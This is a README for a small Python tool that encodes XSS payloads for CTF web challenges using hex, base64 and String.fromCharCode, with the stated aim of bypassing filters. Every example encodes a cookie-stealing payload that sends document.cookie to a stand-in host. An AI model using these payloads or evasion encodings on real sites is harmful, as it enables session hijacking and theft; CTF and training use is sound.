<div align="center">
  <img height="550px" src="https://user-images.githubusercontent.com/28403617/220600629-9da7b084-4fbc-4212-b10e-d395a178a7f5.svg#gh-light-mode-only">
  <img height="550px" src="https://user-images.githubusercontent.com/28403617/220600634-a43af6ba-fc67-4c47-981b-0c4e9c4aba7b.svg#gh-dark-mode-only">
</div>

## What is this?

It's a simple tool to encode payloads for ctf web challenges.

The main interest of this tool is to encode payloads for XSS vulnerabilities on ctfs challenges. It allows generating payloads with `String.fromCharCode` javascript function, raw hexa values and base64, used to bypass some filters.

## How to use it?

```bash
$ python3 enc-ow-der.py -h
usage: enc-ow-der.py [-h] -i INPUT [-b64] [-fchar] [-v]

optional arguments:
  -h, --help            show this help message and exit
  -i INPUT, --input INPUT
                        input string
  -b64, --base-64       encode as base64
  -fchar, --from-char-code
                        output the result with fromCharCode function
  -v, --verbose         verbose
```

## Examples

#### Hexa encoding

```sh-session
python3 enc-ow-der.py -i "fetch('http://example.com/'+btoa(document.cookie))"
```
```
\x66\x65\x74\x63\x68\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f\x27\x2b\x62\x74\x6f\x61\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x29
```

#### Base64 encoding

```sh-session
python3 enc-ow-der.py -i "fetch('http://example.com/'+btoa(document.cookie))" -b64
```
```
ZmV0Y2goJ2h0dHA6Ly9leGFtcGxlLmNvbS8nK2J0b2EoZG9jdW1lbnQuY29va2llKSk=
```

#### `String.fromCharCode` output
```sh-session
python3 enc-ow-der.py -i "fetch('http://example.com/'+ btoa(document.cookie))" -fchar
```
```
String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,39,43,32,98,116,111,97,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,41)
```

#### Base64 encoding + `String.fromCharCode` output

```sh-session
python3 enc-ow-der.py -i "fetch('http://example.com/'+ btoa(document.cookie))" -fchar -b64
```
```
String.fromCharCode(90,109,86,48,89,50,103,111,74,50,104,48,100,72,65,54,76,121,57,108,101,71,70,116,99,71,120,108,76,109,78,118,98,83,56,110,75,121,66,105,100,71,57,104,75,71,82,118,89,51,86,116,90,87,53,48,76,109,78,118,98,50,116,112,90,83,107,112)
```